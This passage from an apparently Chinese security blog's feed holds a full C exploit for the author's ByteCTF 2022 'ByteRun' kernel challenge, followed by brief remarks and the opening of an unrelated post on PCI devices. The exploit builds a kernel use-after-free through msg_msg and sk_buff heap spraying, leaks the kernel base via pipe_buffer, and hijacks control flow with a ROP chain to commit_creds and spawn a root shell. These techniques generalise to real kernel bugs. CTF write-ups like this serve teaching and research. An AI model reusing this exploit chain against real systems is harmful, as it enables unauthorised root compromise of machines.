system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_socket[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br>    <span class="hljs-type">int</span>         dev_fd;<br>    <span class="hljs-type">int</span>         ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.0</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* basic resources alloc */</span><br>    saveStatus();<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, oob_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create socket pair for OOB write!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">/* build 4096 message queue */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">/* spray primary and secondary message */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br>        &#125;<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                    SECONDARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* create hole in primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>) &#123;<br>        ret = readMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* triger off-by-null on primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(dev_fd, oob_socket);<br><br>    <span class="hljs-comment">/* find the queues that have the same secondary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-comment">/* the hole */</span><br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">256</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i) &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* free the victim secondary msg_msg, then we get a UAF */</span><br>    ret = readMsg(msqid[real_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                SECONDARY_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* spray sk_buff to construct fake msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ret = spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* use fake msg_msg to read OOB */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * release and re-spray sk_buff to construct fake msg_msg</span><br><span class="hljs-comment">     * so that we can make an arbitrary read on a primary msg_msg</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* cal the addr of UAF obj by the header we just read out */</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n&quot;</span>, <br>            victim_addr);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* re-construct the msg_msg to fix it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> we need to pass the check in lib/list_debug.c </span><br><span class="hljs-comment">     * what we used to not to pass there is </span><br><span class="hljs-comment">     * &quot;prev-&gt;next == entry&quot; &amp;&amp; &quot;next-&gt;prev == entry&quot;</span><br><span class="hljs-comment">     * so a valid memory with [addr of entry] should be set there</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(fake_second_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x50</span>; i++) &#123;<br>        ((<span class="hljs-type">size_t</span>*)(fake_second_msg))[i] = victim_addr;<br>    &#125;<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            victim_addr + <span class="hljs-number">0x100</span>, victim_addr + <span class="hljs-number">0x100</span>,<br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* release UAF obj as secondary msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    ret = readMsg(msqid[victim_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                VICTIM_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* spray pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">/* write something to activate the pipe */</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* release the sk_buff to read pipe_buffer, leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_second_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            ret = read(sk_sockets[i][<span class="hljs-number">1</span>], <br>                        &amp;fake_second_msg, <br>                        <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_second_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_second_msg;<br>    <span class="hljs-comment">/* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */</span><br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8133151b</span> + kernel_offset;<br>    <span class="hljs-comment">/* ret */</span><br>    ops_ptr-&gt;get = <span class="hljs-number">0xffffffff81331534</span> + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_second_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = \<br>                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于堆喷的不稳定性，在第一阶段还是有可能会挂掉的，因此这道题目其实还是需要爆破的一道题目，几率 1&#x2F;16：</p><p><img src="https://s2.loli.net/2022/09/30/skFd76cRPruwQip.jpg" alt="img.jpg"></p><h1 id="0x03-解题情况"><a href="#0x03-解题情况" class="headerlink" title="0x03.解题情况"></a>0x03.解题情况</h1><p>这道题笔者最初出题的时候是按照签到题的难度出的，因为这道题的两个阶段：阶段一的 kernel UAF 其实是可以直接使用通解完成解题的，而阶段二的 QEMU 逃逸则是一个非常直白的越界读写漏洞，利用起来也不算困难。</p><p>但最后并没有队伍解开这道题，可能是因为大家觉得笔者的题目太简单了都不屑于做吧（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ByteCTF" scheme="https://arttnba3.github.io/tags/ByteCTF/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="QEMU escape" scheme="https://arttnba3.github.io/tags/QEMU-escape/"/>
    
  </entry>
  
  <entry>
    <title>【HARDWARE.0x00】PCI 设备简易食用手册</title>
    <link href="https://arttnba3.github.io/2022/08/30/HARDWARE-0X00-PCI_DEVICE/"/>
    <id>https://arttnba3.github.io/2022/08/30/HARDWARE-0X00-PCI_DEVICE/</id>
    <published>2022-08-29T18:13:17.000Z</published>
    <updated>2023-10-27T11:40:59.162Z</updated>
    
    <content type="html"><![CDATA[<p>👴等会把你总线都给扬了</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>因为笔者最近不懂为什么开始写 PCI 设备驱动了，但笔者是 <em>网络空间安全专业</em> 的本科生，此前基本上没有接触过与硬件相关联的知识（<del>因为计组和微原课讲的就是个🐓⑧</del>），所以开了这篇新的博客简要记载一些与 PCI 设备相关的基础知识、基本 Linux PCI 驱动的编写等</p><blockquote><p>为了写这篇博客，笔者翻了笔者大二上学期的计算机组成原理的课本，还翻了大二下学期的微机原理的课本，发现<strong>这两门课根本就是什么都没讲……<strong>因为也弄不到微院那边相关的教材，所以本篇博客</strong>并没有一个系统性的指导</strong>来辅助写作，都是各种东拼西凑＋笔者自己的理解，<strong>很多东西因为笔者自身水平低下的缘故只能一笔带过</strong>，因此可能会显得不够专业，希望读者见谅XD</p><blockquote><p>如果需要更为专业的参考资料请直接参考 <a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">《PCI_Express_Technology》</a></p></blockquote><blockquote><p>以及笔者非常深刻的意识到在硬件这一块的知识笔者相比于那些专门搞硬件的人而言**确实差了很多…..**只能说继续努力吧XD</p></blockquote></blockquote><h1 id="0x01-PCI-basic-knowledge"><a href="#0x01-PCI-basic-knowledge" class="headerlink" title="0x01. PCI basic knowledge"></a>0x01. PCI basic knowledge</h1><h2 id="一、总线结构简述"><a href="#一、总线结构简述" class="headerlink" title="一、总线结构简述"></a>一、总线结构简述</h2><p>我们都知道计算机的五个基本组件为：<strong>输入，输出，存储器，运算器（或数据通路），控制器</strong>。那么这几大组件之间怎么通信呢？答案是依靠<strong>系统总线</strong></p><p><strong>总线</strong>（bus）是一种将多个功能单元进行连接并允许功能单元之间进行数据交换的一种数据通路，在现代计算机中通常采用总线结构，即存在一根主要的公共通信干线，CPU 